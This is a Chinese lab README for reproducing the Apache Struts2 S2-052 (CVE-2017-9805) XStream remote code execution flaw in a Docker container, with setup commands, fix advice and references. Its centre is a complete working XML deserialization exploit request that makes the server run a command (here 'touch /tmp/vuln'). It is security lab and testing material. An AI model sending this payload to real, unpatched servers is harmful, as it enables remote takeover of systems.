## Struts2 XStreamHandler 远程代码执行漏洞(S2-052､ CVE-2017-9805)环境

### 漏洞信息

 * [S2-052 公告](https://cwiki.apache.org/confluence/display/WW/S2-052)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_struts2_s2-052
 ```

2. 启动环境

 ```
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-052
 ```
 > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### Exp

 来源：[Tomcat部署war - caiqiiqi的博客](http://blog.csdn.net/caiqiiqi/article/details/77861477)

执行 `/usr/bin/touch /tmp/vuln` 命令：

```
POST /orders;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 1659
Referer: http://127.0.0.1:8080/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1


<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>/usr/bin/touch</string><string>/tmp/vuln</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map>
```

发送之后，会在目标主机创建 `/tmp/vuln` 文件

**注意**

`POST /orders` 这个链接在本例中是这样请求的，在实际测试过程中可以直接对站点根目录请求 `POST /`

### 修复建议

1. 升级Apache struts 至 2.5.13 版本

2. 如果系统没有使用Struts REST插件，那么可以直接删除Struts REST插件，或者在配置文件中加入如下代码，限制服务端文件的扩展名

```
<constant name="struts.action.extension" value="xhtml,,json" />
```

### 参考链接

* [Using QL to find a remote code execution vulnerability in Apache Struts (CVE-2017-9805)](https://lgtm.com/blog/apache_struts_CVE-2017-9805)
* [【漏洞预警】Apache Struts2插件高危漏洞(S2-052)](http://bobao.360.cn/news/detail/4291.html)
* [Tomcat部署war - caiqiiqi的博客](http://blog.csdn.net/caiqiiqi/article/details/77861477)
